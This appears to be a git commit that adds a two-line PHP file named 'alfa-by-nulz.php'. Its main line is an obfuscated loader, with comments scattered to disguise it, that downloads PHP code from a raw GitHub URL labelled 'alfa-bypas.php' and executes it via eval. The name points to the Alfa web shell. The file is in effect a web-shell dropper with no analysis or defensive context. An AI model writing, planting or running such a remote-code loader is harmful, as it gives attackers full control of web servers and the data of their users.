4a9522c27dd4cc1703d707eb992384a96bf2017f
NuLz <129581037+haxorstars@users.noreply.github.com>
2023-10-22 14:16:08 +0700

    nulz

---
+++ alfa/alfa-by-nulz.php
@@ -0,0 +1,2 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa-bypas.php"))/******/ /*By NuLz404*/?>
+<?php // NuLz Ganteng ?>
